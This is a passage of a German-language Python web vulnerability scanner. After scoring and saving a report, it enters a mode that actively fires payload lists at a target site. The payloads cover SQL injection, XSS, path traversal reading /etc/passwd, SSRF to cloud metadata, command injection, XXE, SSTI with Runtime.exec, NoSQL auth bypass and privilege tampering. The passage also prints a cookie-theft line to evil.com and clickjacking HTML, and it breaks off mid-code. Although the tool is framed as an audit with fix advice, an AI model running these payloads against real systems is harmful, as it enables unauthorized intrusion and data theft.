        _ok("JS-Dateien: keine Secrets gefunden")

    # ═══ 32. PATH NORMALIZATION BYPASS ═══════════════════════
    _section("PATH NORMALIZATION BYPASS", 32, TOTAL)
    path_hit = None
    path_bypasses = [
        ("/admin/../admin/",      "Double-Slash"),
        ("/%2fadmin%2f",          "URL-encoded /"),
        ("/./admin/./",           "Dot-Segment"),
        ("//admin//",             "Double-Slash"),
        ("/admin%20/",            "Space-encoded"),
        ("/%61dmin/",             "Char-encoded a"),
        ("/ADMIN/",               "Uppercase"),
        ("/admin;jsessionid=x",   "Parameter-Append"),
        ("/api/v1/../v2/admin",   "Version-Traversal"),
    ]
    for path, label in path_bypasses:
        c2,_,b2,_ = _req(base+path)
        b2l = b2.lower()
        if c2 == 200 and any(x in b2l for x in ["admin","dashboard","panel","management"]) \
           and not any(x in b2l for x in ["login","sign in","<!doctype"]):
            path_hit = (path, label); break
    if path_hit:
        path, label = path_hit
        _hit(2,"BYPASS","Path Normalization Bypass", f"{label}: {path}",
             "Zugriffskontrolle prüft /admin aber nicht /%2fadmin oder /./admin/ — Bypass möglich.",
             "Access-Control auf normalisiertem Pfad prüfen. Framework-Routing nicht vertrauen.")
    else:
        _ok("Path Normalization: kein Bypass-Pfad gefunden")

    print(f"  {DG}╠{'═'*W}╣{R}")

    # ══════════════════════════════════════════════════════════
    # ABSCHLUSS-REPORT
    # ══════════════════════════════════════════════════════════
    crits = [f for f in all_findings if f[0]==3]
    highs = [f for f in all_findings if f[0]==2]
    warns = [f for f in all_findings if f[0]==1]
    infos = [f for f in all_findings if f[0]==0]
    score = max(0, 100 - len(crits)*20 - len(highs)*10 - len(warns)*3)

    if score>=80:   sc=GRN;  grade="A — GUT GESICHERT"
    elif score>=60: sc=YEL;  grade="B — VERBESSERUNGSBEDARF"
    elif score>=40: sc=RED;  grade="C — GEFÄHRDET"
    else:           sc=BRED; grade="D — KRITISCH UNSICHER"

    print(f"  {DG}║{R}  {YEL}SECURITY SCORE:{R}  {sc}{score}/100{R}  {sc}{grade}{R}")
    print(f"  {DG}║{R}  {BRED}KRITISCH:{len(crits):<3}{R}  {RED}HOCH:{len(highs):<3}{R}  {YEL}WARN:{len(warns):<3}{R}  {DIM2}INFO:{len(infos)}{R}")
    print(f"  {DG}╚{'═'*W}╝{R}")

    if not all_findings:
        print(f"\n  {GRN}[✓] Keine Schwachstellen gefunden — sehr gut gesichert!{R}")
        wait(); return

    # ── Vollständige Zusammenfassung ──────────────────────
    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {BRED}ZUSAMMENFASSUNG ALLER BEFUNDE{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    for sev, kat, name, detail, erkl, fix in sorted(all_findings, reverse=True):
        lbl = f"{BRED}[KRIT]{R}" if sev==3 else f"{RED}[HOCH]{R}" if sev==2 else f"{YEL}[WARN]{R}" if sev==1 else f"{DIM2}[INFO]{R}"
        print(f"  {DG}║{R}  {lbl}  {YEL}{name}{R}")
        print(f"  {DG}║{R}    {BLU}Was:{R}   {DIM2}{erkl[:65]}{R}")
        print(f"  {DG}║{R}    {RED}Detail:{R} {DIM2}{detail[:65]}{R}")
        print(f"  {DG}║{R}    {GRN}Fix:{R}   {DIM2}{fix[:65]}{R}")
        print(f"  {DG}║{R}  {DIM2}{'·'*W}{R}")

    print(f"  {DG}╚{'═'*W}╝{R}")

    # ── Als Datei speichern ───────────────────────────────
    sv = inp("\nReport speichern? (j/n) [j]").lower()
    if sv != "n":
        now_s  = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        safe   = base.replace("https://","").replace("http://","").replace("/","_")[:25]
        fname  = f"master_scan_{safe}_{now_s}.txt"
        lines  = [
            "="*72,
            f"  MASTER SECURITY SCAN REPORT",
            f"  Erstellt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"  Ziel:     {base}",
            f"  Score:    {score}/100  —  {grade.replace(chr(27)+'[92m','').replace(chr(27)+'[0m','')}",
            f"  Befunde:  KRIT={len(crits)}  HOCH={len(highs)}  WARN={len(warns)}  INFO={len(infos)}",
            "="*72, "",
        ]
        for sev, kat, name, detail, erkl, fix in sorted(all_findings, reverse=True):
            lv = ["INFO","WARN","HOCH","KRIT"][sev]
            lines += [f"[{lv}] {name}","─"*50,
                      f"  Kategorie : {kat}",
                      f"  Detail    : {detail}",
                      f"  Was       : {erkl}",
                      f"  Fix       : {fix}", ""]
        lines += ["="*72,
                  "ALLGEMEINE EMPFEHLUNGEN:",
                  "  1. Prepared Statements für alle DB-Queries",
                  "  2. Input-Validierung serverseitig",
                  "  3. Output-Encoding (htmlspecialchars)",
                  "  4. HTTPS + HSTS erzwingen",
                  "  5. Security Headers setzen",
                  "  6. Rate-Limiting + Account-Lockout",
                  "  7. Backups/Configs aus Web-Root entfernen",
                  "  8. Regelmäßige Updates aller Dependencies",
                  "="*72]
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
            print(f"\n  {GRN}[✓] Report gespeichert: {YEL}{fname}{R}")
        except Exception as e:
            print(f"  {RED}[!] {e}{R}")

    # ── BYPASS DIREKT AUSFÜHREN ───────────────────────────
    exploitable = [(sev,kat,name,detail,erkl,fix)
                   for sev,kat,name,detail,erkl,fix in all_findings if sev >= 2]
    if not exploitable:
        print(f"\n  {GRN}Keine kritischen Befunde — nichts zum Testen.{R}")
        wait(); return

    # Payloads je Schwachstellentyp
    BYPASS_PAYLOADS = {
        "sql": [
            ("' OR '1'='1",          "?id=","Classic OR"),
            ("' OR 1=1--",           "?id=","Kommentar"),
            ("admin'--",             "?user=","Admin-Bypass"),
            ("' UNION SELECT 1,2--", "?id=","UNION"),
            ("1' AND SLEEP(2)--",    "?id=","Time-based"),
            ("' OR 'x'='x",          "?q=","String-OR"),
            ("1 AND 1=1",            "?id=","Boolean True"),
            ("' OR 1=1#",            "?id=","Hash-Kommentar"),
        ],
        "xss": [
            ("<script>alert(1)</script>",         "?q="),
            ("<img src=x onerror=alert(1)>",      "?q="),
            ('"><script>alert(1)</script>',        "?search="),
            ("<svg onload=alert(1)>",             "?q="),
            ("<ScRiPt>alert(1)</ScRiPt>",         "?q="),
            ("%3Cscript%3Ealert(1)%3C%2Fscript%3E","?q="),
            ("javascript:alert(1)",               "?url="),
            ("<iframe src=javascript:alert(1)>",  "?q="),
        ],
        "lfi": [
            ("../../../etc/passwd",               "?file="),
            ("..%2F..%2F..%2Fetc%2Fpasswd",       "?file="),
            ("....//....//....//etc/passwd",      "?path="),
            ("..%252f..%252fetc%252fpasswd",      "?file="),
            ("../../../windows/win.ini",          "?file="),
            ("php://filter/read=convert.base64-encode/resource=index.php","?file="),
            ("/etc/passwd",                       "?file="),
            ("C:\\windows\\win.ini",              "?file="),
        ],
        "ssrf": [
            ("http://169.254.169.254/latest/meta-data/","?url="),
            ("http://127.0.0.1:22",               "?url="),
            ("http://127.0.0.1:6379",             "?url="),
            ("file:///etc/passwd",                "?url="),
            ("http://localhost/admin",            "?url="),
            ("http://0.0.0.0/",                  "?url="),
            ("dict://127.0.0.1:6379/info",        "?url="),
        ],
        "cmd": [
            ("; id",                "?cmd="),
            ("| id",                "?cmd="),
            ("`id`",                "?cmd="),
            ("$(whoami)",           "?cmd="),
            ("; cat /etc/passwd",   "?cmd="),
            ("& whoami",            "?exec="),
            ("; sleep 2",           "?cmd="),
            ("| net user",          "?cmd="),
        ],
        "redirect": [
            ("https://evil-test.com", "?url="),
            ("//evil-test.com",       "?redirect="),
            ("https://evil-test.com", "?next="),
            ("https://evil-test.com", "?goto="),
            ("/\\evil-test.com",      "?redirect="),
            ("https://evil-test.com", "?return="),
        ],
        "header": [
            {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": "/admin"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-Host": "evil.com"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"},
        ],
        "cors": [
            "https://evil.com",
            "null",
            "https://evil.example.com",
            "https://attacker.com",
        ],
        "file": [
            "/.env", "/.env.local", "/.env.production",
            "/.git/HEAD", "/.git/config",
            "/config.php.bak", "/wp-config.php.bak",
            "/backup.zip", "/database.sql",
            "/phpmyadmin/", "/adminer.php",
            "/actuator/env", "/.htpasswd",
            "/server-status", "/crossdomain.xml",
        ],
        "idor": [
            ("?id=",       [1,2,3,100,999]),
            ("?user=",     [1,2,3]),
            ("?uid=",      [1,2,3]),
            ("?account=",  [1,2,3]),
            ("?order=",    [1,2,100]),
            ("?invoice=",  [1,2,3]),
            ("?ticket=",   [1,2,3]),
            ("?doc=",      [1,2,3]),
        ],
        "ssti": [
            ("{{7*7}}",          "?name=",     "49"),
            ("${7*7}",           "?q=",        "49"),
            ("<%= 7*7 %>",       "?msg=",      "49"),
            ("{{7*'7'}}",        "?name=",     "7777777"),
            ("#{7*7}",           "?search=",   "49"),
            ("{{config}}",       "?q=",        "SECRET"),
            ("{{self.__class__.__mro__}}","?name=","object"),
            ("${T(java.lang.Runtime).getRuntime().exec('id')}","?q=","uid="),
        ],
        "nosql": [
            ('{"$gt":""}',                   "application/json", "?username="),
            ('{"$ne":null}',                 "application/json", "?user="),
            ('{"username":{"$gt":""},"password":{"$gt":""}}', "application/json", None),
            ('{"$regex":".*"}',              "application/json", "?q="),
            ("admin' || '1'=='1",            None,               "?username="),
            ("' || 1==1 //",                 None,               "?user="),
        ],
        "tamper": [
            {"isAdmin": "true"},
            {"admin": "1"},
            {"role": "admin"},
            {"user_role": "admin"},
            {"debug": "true"},
            {"price": "0"},
            {"verified": "true"},
            {"is_admin": "true", "is_staff": "true"},
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://169.254.169.254/"><foo>test</foo>',
        ],
        "dirlist": [
            "/uploads/","/images/","/files/","/static/","/assets/",
            "/backup/","/old/","/temp/","/tmp/","/logs/","/data/",
            "/js/","/css/","/includes/","/lib/","/src/","/media/",
        ],
        "crlf": [
            "%0d%0aX-Injected: pwned",
            "%0aX-Injected: pwned",
            "%0d%0aSet-Cookie: injected=true; path=/",
            "\r\nX-Injected: pwned",
            "%E5%98%8A%E5%98%8DX-Injected: pwned",
            "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK",
        ],
        "host_inject": [
            "/password-reset", "/forgot-password", "/reset",
            "/auth/reset", "/account/reset", "/api/forgot",
        ],
        "path_bypass": [
            "/admin/../admin/",   "/%2fadmin%2f",  "/./admin/./",
            "//admin//",          "/ADMIN/",        "/%61dmin/",
            "/admin;x=y",         "/api/v1/../admin",
        ],
        "gql": [
            '{"query":"{__schema{types{name}}}"}',
            '{"query":"query{__typename}"}',
            '{"query":"{__schema{queryType{fields{name}}}}"}',
        ],
        "mass": [
            '{"isAdmin":true,"role":"admin"}',
            '{"role":"admin","permissions":["admin"]}',
            '{"is_admin":true,"is_superuser":true}',
            '{"balance":999999}',
            '{"verified":true,"confirmed":true}',
        ],
    }

    def _run_bypass(sev, kat, name, detail, erkl, fix):
        clear(); print(BANNER)
        print(f"\n  {BRED}[ BYPASS AUSFÜHREN ]{R}  {YEL}{name}{R}")
        print(f"  {DIM}Ziel: {base}{R}")
        print(f"  {BLU}Was:  {DIM}{erkl}{R}")
        print(f"  {GRN}Fix:  {DIM}{fix}{R}\n")
        nl = name.lower()

        def _show(pay, param, label=""):
            url_t = f"{base}/{param}{urllib.parse.quote(str(pay), safe='')}"
            t0    = time.time()
            c2,h2,b2,u2 = _req(url_t)
            dt    = time.time()-t0
            b2l   = b2.lower()
            # Trefferlogik je Typ
            if "sql" in nl:
                hit = any(x in b2l for x in ["sql","mysql","syntax error","warning:","odbc","dashboard","welcome"]) or dt>1.7
            elif "xss" in nl:
                hit = str(pay).lower().replace('"','') in b2l
            elif "lfi" in nl or "path" in nl or "traversal" in nl:
                hit = "root:x:" in b2 or "[fonts]" in b2
            elif "ssrf" in nl:
                hit = any(x in b2l for x in ["ami-id","instance","redis","ssh","root:x:"])
            elif "cmd" in nl or "command" in nl:
                hit = any(x in b2 for x in ["uid=","root","www-data","Administrator"])
            elif "redirect" in nl:
                hit = "evil-test.com" in u2
            else:
                hit = c2 == 200 and len(b2) > 100
            icon  = f"{BRED}[HIT!]{R}" if hit else f"{DIM}[miss]{R}"
            snip  = b2[:45].replace("\n"," ") if hit else f"HTTP {c2}  {dt:.1f}s"
            lbl   = f"  {label:<18}" if label else ""
            print(f"  {icon}{lbl}  {DIM}{str(pay)[:35]:<35}{R}  {GRN if hit else DIM}{snip}{R}")
            return hit

        hit_found = False
        if "sql" in nl:
            print(f"  {DIM}Teste SQL-Injection Payloads ...{R}\n")
            for pay, param, label in BYPASS_PAYLOADS["sql"]:
                if _show(pay, param, label): hit_found = True
                time.sleep(0.08)
        elif "xss" in nl:
            print(f"  {DIM}Teste XSS Payloads ...{R}\n")
            for pay, param in BYPASS_PAYLOADS["xss"]:
                if _show(pay, param): hit_found = True
                time.sleep(0.08)
        elif "lfi" in nl or "path" in nl or "traversal" in nl:
            print(f"  {DIM}Teste Path Traversal / LFI ...{R}\n")
            for pay, param in BYPASS_PAYLOADS["lfi"]:
                if _show(pay, param): hit_found = True
                time.sleep(0.08)
        elif "ssrf" in nl:
            print(f"  {DIM}Teste SSRF Payloads ...{R}\n")
            for pay, param in BYPASS_PAYLOADS["ssrf"]:
                if _show(pay, param): hit_found = True
                time.sleep(0.08)
        elif "cmd" in nl or "command" in nl:
            print(f"  {DIM}Teste Command Injection ...{R}\n")
            for pay, param in BYPASS_PAYLOADS["cmd"]:
                if _show(pay, param): hit_found = True
                time.sleep(0.08)
        elif "redirect" in nl:
            print(f"  {DIM}Teste Open Redirect Payloads ...{R}\n")
            for pay, param in BYPASS_PAYLOADS["redirect"]:
                if _show(pay, param): hit_found = True
                time.sleep(0.08)
        elif "header" in nl or "bypass" in nl:
            print(f"  {DIM}Teste Header-Bypasses gegen {base}/admin ...{R}\n")
            for hdrs_test in BYPASS_PAYLOADS["header"]:
                c2,_,b2,u2 = _req(base+"/admin", hdrs=hdrs_test)
                hit = c2==200 and any(x in b2.lower() for x in ["admin","dashboard","panel"])
                icon = f"{BRED}[HIT!]{R}" if hit else f"{DIM}[miss]{R}"
                pay_str = " | ".join(f"{k}: {v}" for k,v in hdrs_test.items())
                print(f"  {icon}  {DIM}{pay_str[:55]}{R}  {GRN if hit else DIM}HTTP {c2}{R}")
                time.sleep(0.08)
        elif "cors" in nl:
            print(f"  {DIM}Teste CORS Origins ...{R}\n")
            for origin in BYPASS_PAYLOADS["cors"]:
                c2,h2,_,_ = _req(base, hdrs={"Origin": origin})
                acao = h2.get("Access-Control-Allow-Origin","")
                acac = h2.get("Access-Control-Allow-Credentials","")
                hit  = acao in ("*", origin)
                icon = f"{BRED}[HIT!]{R}" if hit else f"{DIM}[miss]{R}"
                print(f"  {icon}  {DIM}Origin: {origin:<30}{R}  {GRN if hit else DIM}ACAO: {acao or 'kein'}  Creds: {acac or 'nein'}{R}")
                time.sleep(0.08)
        elif ".env" in nl or "datei" in nl or "git" in nl or "exposed" in nl or "backup" in nl:
            print(f"  {DIM}Teste sensitive Dateien ...{R}\n")
            for path in BYPASS_PAYLOADS["file"]:
                c2,_,b2,_ = _req(base+path)
                sens = any(x in b2 for x in ["DB_","SECRET","APP_KEY","[core]","ref:","password","define(","CREATE TABLE"])
                hit  = c2==200 and (sens or len(b2)>50)
                icon = f"{BRED}[EXPO!]{R}" if hit else f"{DIM}[  -- ]{R}"
                snip = b2[:40].replace("\n"," ") if hit else f"HTTP {c2}"
                print(f"  {icon}  {DIM}{path:<30}{R}  {GRN if hit else DIM}{snip}{R}")
                time.sleep(0.07)
        elif "rate" in nl:
            print(f"  {DIM}Sende 15 schnelle Requests — testet Rate-Limit ...{R}\n")
            blocked = None
            for i in range(1,16):
                c2,_,_,_ = _req(f"{base}/?bf={i}")
                icon = f"{BRED}[BLOCK]{R}" if c2==429 else f"{GRN}[ OK  ]{R}"
                print(f"  {icon}  Request {i:>2}  HTTP {c2}")
                if c2==429 and not blocked:
                    blocked=i; print(f"\n  {GRN}[✓] Rate-Limit nach {i} Requests — sicher!{R}\n"); break
                time.sleep(0.05)
            if not blocked:
                print(f"\n  {BRED}[!] Kein Rate-Limit nach 15 Requests!{R}")
        elif "csrf" in nl:
            print(f"  {DIM}Sende POST ohne CSRF-Token ...{R}\n")
            c2,_,b2,_ = _req(base, "POST", {"test":"csrf_check_payload"})
            if c2 not in (403,422) and "csrf" not in b2.lower() and "invalid" not in b2.lower():
                print(f"  {BRED}[!] POST ohne Token akzeptiert (HTTP {c2}) — CSRF möglich!{R}")
            else:
                print(f"  {GRN}[✓] POST abgelehnt (HTTP {c2}) — CSRF-Schutz aktiv{R}")
        # ── Security Header Tests ─────────────────────────────
        elif "hsts" in nl or "strict-transport" in nl:
            print(f"  {DIM}Demo: Was passiert ohne HSTS wenn jemand HTTP nutzt?{R}\n")
            http_url = base.replace("https://","http://")
            c2,h2,b2,u2 = _req(http_url)
            sts = h2.get("Strict-Transport-Security","")
            loc = h2.get("Location","")
            print(f"  {DIM}Request:{R}  GET {http_url}")
            print(f"  {DIM}Response:{R} HTTP {c2}")
            if sts:
                print(f"  {GRN}[✓] HSTS Header vorhanden:{R} {sts}")
                hit_found = False
            elif loc and "https" in loc.lower():
                print(f"  {YEL}[~] Redirect zu HTTPS:{R} {loc}")
                print(f"  {YEL}    Aber kein HSTS — Browser merkt sich das nicht!{R}")
                hit_found = True
            else:
                print(f"  {BRED}[!] Kein HSTS, kein HTTPS-Redirect!{R}")
                print(f"  {RED}    → Angreifer kann HTTP erzwingen (MITM){R}")
                print(f"  {RED}    → Passwörter/Cookies im Klartext sichtbar{R}")
                hit_found = True
            print(f"\n  {DIM}Angriffs-Szenario:{R}")
            print(f"  {DIM}  1. Angreifer im gleichen WLAN (Hotel, Café){R}")
            print(f"  {DIM}  2. ARP-Spoofing leitet Traffic über Angreifer{R}")
            print(f"  {DIM}  3. HTTP-Verbindung zeigt Passwörter im Klartext{R}")

        elif "csp" in nl or "content-security" in nl:
            print(f"  {DIM}Demo: XSS-Angriff ohne CSP ...{R}\n")
            pay = "<script>alert('XSS ohne CSP')</script>"
            url_t = f"{base}/?q={urllib.parse.quote(pay,safe='')}"
            c2,h2,b2,_ = _req(url_t)
            csp = h2.get("Content-Security-Policy","")
            print(f"  {DIM}Payload:{R} {pay}")
            print(f"  {DIM}CSP-Header:{R} {csp or 'FEHLT — kein Schutz!'}")
            if csp:
                print(f"  {GRN}[✓] CSP aktiv — XSS eingeschränkt{R}")
                hit_found = False
            else:
                refl = pay.lower() in b2.lower()
                print(f"  {'  '+BRED+'[!] Payload reflektiert!' if refl else '  '+DIM+'Payload nicht reflektiert'}{R}")
                print(f"  {RED}    Ohne CSP darf jedes Script von jeder Domain laden{R}")
                print(f"  {RED}    → XSS, Daten-Diebstahl, Session-Hijacking möglich{R}")
                hit_found = True

        elif "frame" in nl or "clickjack" in nl:
            print(f"  {DIM}Demo: Clickjacking — Seite in iframe einbettbar?{R}\n")
            c2,h2,b2,_ = _req(base)
            xfo = h2.get("X-Frame-Options","")
            csp = h2.get("Content-Security-Policy","")
            fa  = "frame-ancestors" in csp.lower() if csp else False
            print(f"  {DIM}X-Frame-Options:{R}   {xfo or BRED+'FEHLT'+R}")
            print(f"  {DIM}CSP frame-ancestors:{R} {GRN+'vorhanden'+R if fa else BRED+'FEHLT'+R}")
            if xfo or fa:
                print(f"  {GRN}[✓] Clickjacking-Schutz aktiv{R}")
                hit_found = False
            else:
                print(f"  {BRED}[!] Seite kann in iframe eingebettet werden!{R}")
                print(f"\n  {DIM}HTML für Clickjacking-Angriff:{R}")
                print(f"  {YEL}<iframe src=\"{base}\" style=\"opacity:0;position:absolute\"></iframe>{R}")
                print(f"  {YEL}<button onclick=\"stealClick()\">Gewinn hier!</button>{R}")
                print(f"\n  {RED}  → Nutzer klickt auf unsichtbaren Button der echten Seite{R}")
                print(f"  {RED}  → Kann Käufe, Überweisungen, Passwortänderungen auslösen{R}")
                hit_found = True

        elif "mime" in nl or "content-type" in nl or "xcto" in nl or "sniff" in nl:
            print(f"  {DIM}Demo: MIME-Sniffing — Browser errät Dateityp{R}\n")
            c2,h2,b2,_ = _req(base)
            xcto = h2.get("X-Content-Type-Options","")
            ct   = h2.get("Content-Type","")
            print(f"  {DIM}Content-Type:{R}          {ct or 'fehlt'}")
            print(f"  {DIM}X-Content-Type-Options:{R} {xcto or BRED+'FEHLT'+R}")
            if "nosniff" in xcto.lower():
                print(f"  {GRN}[✓] nosniff aktiv — MIME-Sniffing verhindert{R}")
                hit_found = False
            else:
                print(f"  {BRED}[!] Kein nosniff — Browser errät Dateityp selbst!{R}")
                print(f"\n  {DIM}Angriffs-Szenario:{R}")
                print(f"  {DIM}  1. Angreifer lädt Datei mit HTML-Inhalt als 'image.jpg' hoch{R}")
                print(f"  {DIM}  2. Browser erkennt HTML darin und führt es aus{R}")
                print(f"  {DIM}  3. XSS über Upload-Funktion möglich{R}")
                hit_found = True

        elif "referrer" in nl:
            print(f"  {DIM}Demo: Referrer-Leak — welche URL wird weitergegeben?{R}\n")
            c2,h2,b2,_ = _req(base)
            rp = h2.get("Referrer-Policy","")
            print(f"  {DIM}Referrer-Policy:{R} {rp or BRED+'FEHLT'+R}")
            if rp:
                print(f"  {GRN}[✓] Referrer-Policy gesetzt: {rp}{R}")
                hit_found = False
            else:
                print(f"  {BRED}[!] Kein Referrer-Policy — volle URL wird weitergegeben!{R}")
                print(f"\n  {DIM}Beispiel was ein externes Script sieht:{R}")
                print(f"  {YEL}Referer: {base}/user/profile?token=abc123secret{R}")
                print(f"\n  {RED}  → API-Keys, Tokens, User-IDs in URL landen bei Dritten{R}")
                hit_found = True

        elif "cookie" in nl or "httponly" in nl or "secure" in nl or "samesite" in nl:
            print(f"  {DIM}Demo: Cookie-Sicherheitsflags prüfen{R}\n")
            c2,h2,b2,_ = _req(base)
            ck = h2.get("Set-Cookie","")
            if not ck:
                print(f"  {DIM}Kein Set-Cookie Header beim ersten Request.{R}")
                print(f"  {DIM}Teste Login-Seite ...{R}")
                c2,h2,b2,_ = _req(login_url)
                ck = h2.get("Set-Cookie","")
            if ck:
                print(f"  {DIM}Set-Cookie:{R} {ck[:70]}")
                httponly = "httponly" in ck.lower()
                secure   = "secure"   in ck.lower()
                samesite = "samesite" in ck.lower()
                print(f"\n  {'  '+GRN+'[✓]' if httponly else '  '+BRED+'[!]'} HttpOnly: {'JA' if httponly else 'FEHLT — JavaScript kann Cookie lesen!'}{R}")
                print(f"  {'  '+GRN+'[✓]' if secure   else '  '+BRED+'[!]'} Secure:   {'JA' if secure   else 'FEHLT — Cookie über HTTP übertragen!'}{R}")
                print(f"  {'  '+GRN+'[✓]' if samesite  else '  '+YEL+'[~]'} SameSite: {'JA' if samesite  else 'FEHLT — CSRF über Cookie möglich'}{R}")
                if not httponly:
                    print(f"\n  {DIM}XSS kann Cookie stehlen:{R}")
                    print(f"  {YEL}document.location='https://evil.com/?c='+document.cookie{R}")
                hit_found = not (httponly and secure)
            else:
                print(f"  {DIM}Kein Cookie gefunden.{R}")

        elif "server" in nl or "powered" in nl or "banner" in nl or "disclosure" in nl:
            print(f"  {DIM}Demo: Technologie-Offenbarung — was verrät der Server?{R}\n")
            c2,h2,b2,_ = _req(base)
            leaks = {k:v for k,v in h2.items()
                     if k.lower() in ("server","x-powered-by","x-aspnet-version",
                                      "x-aspnetmvc-version","x-generator","via")}
            if leaks:
                print(f"  {BRED}[!] Server verrät Technologie:{R}\n")
                for k,v in leaks.items():
                    print(f"  {YEL}  {k}: {v}{R}")
                print(f"\n  {DIM}Was ein Angreifer damit macht:{R}")
                for k,v in leaks.items():
                    vl = v.lower()
                    if "apache" in vl:
                        print(f"  {RED}  → Apache-Version bekannt → CVE-Suche für {v}{R}")
                    if "php" in vl:
                        print(f"  {RED}  → PHP-Version bekannt → bekannte PHP-Exploits suchen{R}")
                    if "iis" in vl or "asp" in vl:
                        print(f"  {RED}  → IIS/ASP.NET bekannt → Windows-spezifische Angriffe{R}")
                    if "nginx" in vl:
                        print(f"  {RED}  → Nginx-Version bekannt → Aliasing-Bugs, CVEs suchen{R}")
                hit_found = True
            else:
                print(f"  {GRN}[✓] Server verrät keine Technologie-Details{R}")

        elif "https" in nl or "ssl" in nl or "tls" in nl:
            print(f"  {DIM}Demo: HTTP vs HTTPS Verhalten{R}\n")
            http_url = base.replace("https://","http://")
            c2,h2,b2,u2 = _req(http_url)
            loc = h2.get("Location","")
            sts = h2.get("Strict-Transport-Security","")
            print(f"  {DIM}HTTP Request:{R}  GET {http_url}")
            print(f"  {DIM}HTTP Response:{R} {c2}  Location: {loc or 'kein Redirect'}")
            print(f"  {DIM}HSTS:{R}          {sts or 'fehlt'}")
            if c2 in (301,302) and "https" in loc.lower():
                print(f"  {YEL}[~] Redirect vorhanden aber erste Anfrage unverschlüsselt{R}")
                hit_found = True
            elif not base.startswith("https"):
                print(f"  {BRED}[!] Kein HTTPS — komplette Verbindung unverschlüsselt!{R}")
                hit_found = True
            else:
                print(f"  {GRN}[✓] HTTPS aktiv{R}")

        elif "waf" in nl:
            print(f"  {DIM}Demo: WAF-Erkennung und Bypass-Versuche{R}\n")
            test_payloads = [
                ("<script>alert(1)</script>",     "Standard XSS"),
                ("%3Cscript%3Ealert%281%29%3C%2Fscript%3E", "URL-encoded"),
                ("' OR 1=1--",                    "SQLi"),
                ("../../../etc/passwd",            "Path Traversal"),
            ]
            for pay, label in test_payloads:
                url_t = f"{base}/?q={pay}"
                c2,h2,b2,_ = _req(url_t)
                blocked = c2 in (403,406,429,501,503)
                icon = f"{GRN}[GEBLOCKT]{R}" if blocked else f"{BRED}[DURCH!  ]{R}"
                print(f"  {icon}  {DIM}{label:<20}{R}  HTTP {c2}  {DIM}{pay[:30]}{R}")
                time.sleep(0.1)

        elif "idor" in nl or "insecure direct" in nl or "fremddaten" in nl:
            print(f"  {DIM}Teste IDOR — verschiedene IDs abrufen ...{R}\n")
            for param, ids in BYPASS_PAYLOADS["idor"]:
                for id_val in ids:
                    url_t = f"{base}/{param}{id_val}"
                    c2,_,b2,_ = _req(url_t)
                    b2l = b2.lower()
                    is_html = b2l.strip().startswith("<!doctype") or "<html" in b2l[:100]
                    has_data = any(x in b2l for x in ["email","user","name","account","order","id","price"])
                    hit = c2==200 and has_data and not is_html
                    icon = f"{BRED}[DATEN!]{R}" if hit else f"{DIM}[  -- ]{R}"
                    snip = b2[:50].replace("\n"," ") if hit else f"HTTP {c2}"
                    print(f"  {icon}  {DIM}{param}{id_val:<8}{R}  {GRN if hit else DIM}{snip}{R}")
                    time.sleep(0.06)

        elif "ssti" in nl or "template" in nl:
            print(f"  {DIM}Teste SSTI — Template-Ausdrücke in Parametern ...{R}\n")
            for pay, param, expect in BYPASS_PAYLOADS["ssti"]:
                url_t = f"{base}/{param}{urllib.parse.quote(pay,safe='')}"
                _,_,b2,_ = _req(url_t)
                hit = expect.lower() in b2.lower()
                icon = f"{BRED}[AUSGEWERTET!]{R}" if hit else f"{DIM}[miss         ]{R}"
                snip = b2[:40].replace("\n"," ") if hit else f"nicht in Response"
                print(f"  {icon}  {DIM}{pay:<30}{R}  {GRN if hit else DIM}{snip}{R}")
                time.sleep(0.07)

        elif "tamper" in nl or "parameter" in nl or "privilege" in nl or "escalat" in nl:
            print(f"  {DIM}Teste Parameter-Tampering — Admin-Flags in POST-Body ...{R}\n")
            for data in BYPASS_PAYLOADS["tamper"]:
                c2,_,b2,_ = _req(base, "POST", data)
                b2l = b2.lower()
                hit = c2 not in (403,401,422) and any(x in b2l for x in ["admin","dashboard","success","granted","true","welcome"])
                icon = f"{BRED}[AKZEPTIERT!]{R}" if hit else f"{DIM}[  miss     ]{R}"
                pay_str = " & ".join(f"{k}={v}" for k,v in data.items())
                snip = b2[:35].replace("\n"," ") if hit else f"HTTP {c2}"
                print(f"  {icon}  {DIM}{pay_str:<35}{R}  {GRN if hit else DIM}{snip}{R}")
                time.sleep(0.07)

        elif "nosql" in nl:
            print(f"  {DIM}Teste NoSQL Injection — MongoDB-Operatoren ...{R}\n")
            for pay, ct, param in BYPASS_PAYLOADS["nosql"]:
                if param:
                    url_t = f"{base}/{param}{urllib.parse.quote(pay,safe='')}"
                    c2,_,b2,_ = _req(url_t)
                else:
                    c2,_,b2,_ = _req(login_url,"POST",pay,
                                      hdrs={"Content-Type":"application/json"} if ct else None)
                b2l = b2.lower()
                hit = c2 not in (400,401,403,422,500) and \
                      any(x in b2l for x in ["dashboard","welcome","logged","token","account","user"]) and \
                      not any(x in b2l for x in ["invalid","error","failed","<!doctype"])
                icon = f"{BRED}[BYPASS!]{R}" if hit else f"{DIM}[miss   ]{R}"
                snip = b2[:40].replace("\n"," ") if hit else f"HTTP {c2}"
                print(f"  {icon}  {DIM}{pay[:38]:<38}{R}  {GRN if hit else DIM}{snip}{R}")
                time.sleep(0.07)

        elif "xxe" in nl or "xml" in nl or "external entity" in nl:
            print(f"  {DIM}Teste XXE — XML External Entity Injection ...{R}\n")
            xml_eps = [base+"/",base+"/api/",base+"/api/upload",base+"/upload",
